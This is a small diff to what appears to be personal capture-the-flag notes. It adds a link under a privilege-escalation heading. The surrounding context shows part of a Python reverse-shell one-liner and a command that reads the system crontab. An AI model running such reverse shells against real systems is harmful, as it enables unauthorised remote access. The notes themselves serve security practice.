@@ -156,6 +156,9 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 ## PrivEsc
 
+#### My Notes
+- [PrivEsc](https://github.com/Ruhanyat-994/myCTF/tree/master/THM-CTF/my-materials/PrivEsc)
+
 - #### **Finding info in the crontab**
 ```sh
 cat /etc/crontab 
